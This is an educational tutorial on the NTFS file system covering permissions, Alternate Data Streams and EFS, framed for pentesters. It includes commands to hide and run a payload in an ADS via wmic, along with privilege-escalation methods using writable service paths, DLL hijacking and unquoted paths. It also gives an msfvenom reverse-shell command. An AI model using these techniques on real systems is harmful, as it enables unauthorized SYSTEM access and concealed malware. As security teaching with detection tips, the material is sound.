Chapter 01 // Definition

📖 What is NTFS?

NTFS (New Technology File System) is the default file system on modern Windows (NT, 2000, XP, 7, 10, 11, Server editions). It replaced FAT16/FAT32 and brought serious upgrades: per-file permissions, journaling for crash recovery, native encryption, and support for massive files.

📝 NTFS is like a fancy filing cabinet with locks on every drawer and a security camera recording who opened what

FAT32 was like an old cardboard box — anyone could reach in, grab anything, and there was a hard limit on file size (4 GB). NTFS is a steel filing cabinet where every drawer has its own lock (per-file permissions), there's a security camera logging who opened what (journaling), some drawers have built-in encryption (EFS), and there are even hidden compartments taped behind the drawers that nobody sees unless they know to look (Alternate Data Streams). The filing cabinet also doesn't care if you shove a 100 GB file in — it just handles it.

Why NTFS replaced FAT

🚫 FAT32 limitations

  • Max file size: 4 GB (can't even store a single DVD image)
  • Max partition: 2 TB (with caveats)
  • Zero file permissions — anyone who can access the drive can read/write everything
  • No journaling — power failure = possible corruption

✅ NTFS brings

  • Max file size: 16 EB (exabytes — effectively unlimited)
  • Per-file and per-folder ACL permissions
  • Journaling — logs changes before writing, survives crashes
  • EFS encryption, compression, Alternate Data Streams

Chapter 02 // NTFS Permissions

🔐 The six NTFS permission levels

Every file and folder on NTFS has an Access Control List (ACL) — a list of "who can do what." Here are the six standard permission types:

👑 Full Control

Read, write, execute, delete, change permissions, and take ownership. The king of permissions. Admins get this on system files.

✏️ Modify

Read, write, execute, and delete the file/folder. Everything except changing permissions and taking ownership.

▶️ Read & Execute

View file contents AND run executables/scripts. For folders: traverse (enter) the directory.

📂 List Folder Contents

Only applies to folders — see what's inside, but can't necessarily open the files. Think: reading the labels on the filing cabinet drawers.

📖 Read

View file contents and attributes. Can't modify, can't execute. The "look but don't touch" permission.

📝 Write

Create new files/folders and modify existing ones. But can't delete, can't execute, can't change permissions.

How to check NTFS permissions

Right-click any file or folder → Properties → Security tab. You'll see a list of users/groups and their permissions. From the command line:

# CMD — show permissions on a file/folder icacls C:\Users\target\Documents # PowerShell — detailed ACL view Get-Acl C:\Users\target\Documents | Format-List
💡 Inheritance matters. By default, child folders and files inherit permissions from their parent. A misconfigured parent folder = every file inside is misconfigured too. Always check the "Advanced" button in the Security tab to see where permissions are coming from.
hidden streams
Chapter 03 // Alternate Data Streams (ADS)

👻 The hidden compartments in every NTFS file

Here's something most Windows users never learn: on NTFS, every file can have multiple data streams. The "normal" content you see is the default (unnamed) stream. But you can attach additional named streams — invisible to Windows Explorer, invisible to dir, invisible to most antivirus.

Legitimate uses

  • Zone Identifier: When you download a file from the internet, Windows tags it with :Zone.Identifier — that's an ADS. It's how Windows knows to show the "This file came from the internet" warning.
  • Thumbnails and metadata can be stored in streams.

Malicious uses 🥷

Attackers LOVE Alternate Data Streams because:

  • You can hide an entire executable inside an innocent-looking text file
  • The file size shown in Explorer doesn't change — the ADS is invisible
  • Many older AV tools don't scan ADS
# Hide a payload inside a text file (CMD) type malware.exe > innocent.txt:hidden.exe # Run the hidden payload wmic process call create "C:\path\innocent.txt:hidden.exe" # Detect ADS — list all streams on a file dir /R C:\path\innocent.txt # PowerShell — list streams Get-Item C:\path\innocent.txt -Stream *
🚨 Defense tip: Modern Windows Defender DOES scan ADS. But in forensics and incident response, always check for hidden streams with dir /R or Get-Item -Stream *. Sysinternals streams.exe can recursively scan entire directories.

Chapter 04 // How pentesters exploit weak NTFS permissions

🥷 When the filing cabinet is left unlocked

Weak NTFS permissions are a goldmine for privilege escalation on Windows. Here are the big ones:

CLASSIC

🎯 Writable service binary path

A Windows service runs as SYSTEM. The .exe it points to lives in a folder where your low-priv user has Write permission. Replace the exe with a reverse shell. Restart the service (or wait for a reboot). SYSTEM shell.

CLASSIC

📦 DLL hijacking

A privileged process loads a DLL from a writable directory. Drop a malicious DLL with the same name → the process loads YOUR code with its privileges.

COMMON

📂 Unquoted service paths

Service path: C:\Program Files\My App\service.exe (unquoted). Windows tries C:\Program.exe, then C:\Program Files\My.exe. If you can write to C:\, drop a Program.exe reverse shell.

RECON

🔍 Overly permissive shares

Network shares with Everyone: Full Control. Read config files, plant malicious scripts, or modify shared executables.

# Find services with writable paths (PowerShell) Get-WmiObject win32_service | Where-Object { $_.PathName -and (Test-Path (Split-Path $_.PathName.Trim('"'))) } | Select-Object Name, StartName, PathName # Check if current user can write to a service path (icacls) icacls "C:\Program Files\VulnApp\service.exe" # Look for (M) or (F) next to your user/group = Modify or Full Control

🧠 Brain Power

You find a Windows service running as SYSTEM whose executable path is writable by your low-priv user. What do you do?

Replace the exe with a reverse shell payload (e.g., generated with msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOU LPORT=4444 -f exe -o service.exe). Then restart the service with sc stop VulnService && sc start VulnService (or wait for a reboot). The service starts YOUR binary — as SYSTEM. You catch the shell on your listener. Game over. 👑

This is one of the most common Windows privesc paths. Tools like PowerUp and winPEAS automatically scan for this.

Chapter 05 // EFS — Encrypting File System

🔒 File-level encryption on NTFS

NTFS includes EFS (Encrypting File System) — the ability to encrypt individual files and folders. It's different from BitLocker (which encrypts entire drives).

🔒 EFS

Encrypts individual files/folders. Tied to the user's Windows account — if they're logged in, decryption is transparent. Protects against other users on the same machine.

💿 BitLocker

Encrypts the entire drive. Protects against physical theft (someone pulling the hard drive). Once Windows boots and you log in, everything is decrypted.

💡 Pentest angle: EFS-encrypted files are accessible while the owning user is logged in. If you escalate to their session (or extract their EFS certificate from the registry), the encryption is irrelevant. EFS is not a barrier to an attacker who already has the user's credentials.

🎯 Quick Check

What command reveals Alternate Data Streams hidden inside a file on NTFS?
dir /A — shows hidden files
dir /R — lists all data streams per file
attrib -h — removes the hidden attribute
type file.txt — prints file contents
